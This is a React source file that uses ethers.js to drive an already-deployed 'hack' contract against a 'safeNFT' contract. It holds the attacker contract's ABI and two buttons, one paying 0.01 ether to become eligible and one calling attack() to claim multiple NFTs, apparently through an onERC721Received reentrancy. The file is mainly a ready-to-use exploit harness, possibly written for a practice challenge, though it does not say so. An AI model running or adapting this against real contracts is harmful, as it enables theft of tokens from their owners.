import { ethers } from "ethers";
import React from "react";

const HACK_CONTRACT_ADDRESS = "0x93Dd30d6ae3ca32A7bcdcFf88Db56aa9c35f8478";
const HACK_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_safeNFTContractAddress",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "attack",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "claimNFT",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "count",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "",
        "type": "bytes"
      }
    ],
    "name": "onERC721Received",
    "outputs": [
      {
        "internalType": "bytes4",
        "name": "",
        "type": "bytes4"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "safeNFTContract",
    "outputs": [
      {
        "internalType": "contract safeNFT",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

const App = () => {


  const EligibleNFT = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const hackconnectedContract = new ethers.Contract(HACK_CONTRACT_ADDRESS, HACK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]); 
        let claimNFT = await hackconnectedContract.claimNFT({ 
          value: ethers.utils.parseEther("0.01"),
          gasLimit: 60000,
          gasPrice: ethers.utils.parseUnits("20", "gwei")
        });
        console.log("Becoming eligible for claiming NFT: Process started");
        await claimNFT.wait();
        console.log("Becoming eligible for claiming NFT: Process fininshed");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }


  const HackTheContract = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const hackconnectedContract = new ethers.Contract(HACK_CONTRACT_ADDRESS, HACK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]); 

        let attack = await hackconnectedContract.attack();
        console.log("Claiming multiple NFTs: Process started");
        await attack.wait();
        console.log("Claiming multiple NFTs: Process fininshed");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }

  
  return (
    <div>
      <button onClick={() => EligibleNFT().then(/* handle promise here */)}>Becoming eligible for claiming NFT</button>
      <button onClick={() => HackTheContract().then(/* handle promise here */)}>Claim multiple NFTs</button>
    </div>
  );
};

export default App;
